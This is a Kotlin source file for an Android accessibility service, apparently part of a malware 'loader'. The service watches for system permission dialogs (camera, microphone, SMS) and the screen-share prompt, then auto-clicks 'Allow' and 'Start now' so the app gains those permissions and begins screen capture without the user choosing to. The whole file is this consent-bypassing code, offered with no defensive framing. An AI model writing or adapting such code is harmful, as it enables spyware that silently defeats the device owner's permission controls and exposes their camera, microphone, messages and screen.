package com.nexrtz.loader

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class MyAccessibilityService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val root = rootInActiveWindow ?: return
        val pkg = event?.packageName?.toString() ?: ""

        // 1. Handle standard Runtime Permission popups (Camera, Mic, SMS, etc.)
        if (pkg == "com.android.permissioncontroller" || pkg.contains("permission")) {
            if (clickText(root, "Allow") || clickText(root, "While using the app") || clickText(root, "ALLOW")) {
                Log.d("AutoClicker", "Clicked a permission popup")
            }
            return
        }

        // 2. Handle Screen Share popup
        if (pkg == "com.android.systemui") {
            if (clickText(root, "Start now") || clickText(root, "START NOW")) {
                Log.d("AutoClicker", "Clicked screen share popup")
            }
            return
        }
    }

    private fun clickText(root: AccessibilityNodeInfo, text: String): Boolean {
        val nodes = root.findAccessibilityNodeInfosByText(text)
        for (node in nodes) {
            if (node.isClickable) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
            var parent = node.parent
            while (parent != null) {
                if (parent.isClickable) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return true
                }
                parent = parent.parent
            }
        }
        return false
    }

    override fun onInterrupt() {}
}